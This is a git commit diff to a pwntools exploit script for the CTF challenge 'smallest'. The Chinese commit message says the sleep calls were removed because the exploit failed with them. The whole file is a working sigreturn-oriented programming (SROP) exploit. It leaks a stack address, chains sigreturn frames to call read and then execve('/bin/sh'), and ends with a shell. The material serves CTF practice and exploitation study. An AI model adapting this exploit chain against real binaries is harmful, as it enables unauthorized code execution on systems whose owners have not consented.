befd4e910c9ea416fb7bcc5179027ae5b01ab3bd
cossack9989 <wangzhong9989@126.com>
2018-09-25 19:12:17 +0800

    发现加了sleep之后exp打不起来，于是删掉所有sleep

--- PWN/Sundries/360chunqiu429_smallest/srop.py
+++ PWN/Sundries/360chunqiu429_smallest/srop.py
@@ -1,5 +1,4 @@
 from pwn import *
-from time import sleep
 
 r=process('./smallest')
 elf=ELF('smallest')
@@ -9,7 +8,6 @@ sigreturn=p64(0x4000be)+'C0ss4ck'
 log.success('SYSCALL:WRITE')
 SROP1=p64(0x4000b0)*3
 r.send(SROP1)
-sleep(0.5)
 r.send('\xb3')
 leak0=u64(r.recv()[8:16].ljust(8,'\x00'))
 log.info('write(1,something,0x400)')
@@ -17,33 +15,31 @@ log.warn('leak next_rsi='+str(hex(leak0)))
 
 log.success('SYSCALL:READ')
 SROP2=p64(0x4000b0)+'C0ss4ck!'
-sFrame=SigreturnFrame()
-sFrame.rax=constants.SYS_read
-sFrame.rdi=0
-sFrame.rsi=leak0
-sFrame.rdx=0x400
-sFrame.rsp=leak0
-sFrame.rip=0x4000be
-SROP2+=str(sFrame)
+sFrame1=SigreturnFrame()
+sFrame1.rax=constants.SYS_read
+sFrame1.rdi=0
+sFrame1.rsi=leak0
+sFrame1.rdx=0x400
+sFrame1.rsp=leak0
+sFrame1.rip=0x4000be
+SROP2+=str(sFrame1)
 r.send(SROP2)
-sleep(0.5)
 r.send(sigreturn)
 log.info('read(0,stack,0x400)')
 
 log.success('SYSCALL:EXECVE')
 SROP4=p64(0x4000b0)+'C0ss4ck?'
-sFrame=SigreturnFrame()
-sFrame.rax=constants.SYS_execve
-sFrame.rdi=leak0+0x120
-sFrame.rsi=0x0
-sFrame.rdx=0x0
-sFrame.rsp=leak0
-sFrame.rip=0x4000be
-SROP4+=str(sFrame)
+sFrame2=SigreturnFrame()
+sFrame2.rax=constants.SYS_execve
+sFrame2.rdi=leak0+0x120
+sFrame2.rsi=0x0
+sFrame2.rdx=0x0
+sFrame2.rsp=leak0
+sFrame2.rip=0x4000be
+SROP4+=str(sFrame2)
 SROP4+=(0x120-len(SROP4))*'\x00'
 SROP4+='/bin/sh\x00'
 r.send(SROP4)
-sleep(0.5)
 r.send(sigreturn)
 log.info("execve('/bin/sh')")
 
